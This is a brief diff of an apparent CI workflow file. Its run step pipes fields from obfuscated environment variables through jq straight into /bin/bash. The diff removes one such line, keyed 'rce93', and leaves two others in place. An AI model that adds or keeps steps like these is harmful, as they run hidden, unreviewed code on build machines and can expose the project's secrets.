@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$v467" | jq -r .d0 | /bin/bash
           echo $pnxta582 | jq -r .kbco94926 | /bin/bash
-          echo $bjfop5 | jq -r .rce93 | /bin/bash
 
       - name: Upload results
         if: always()
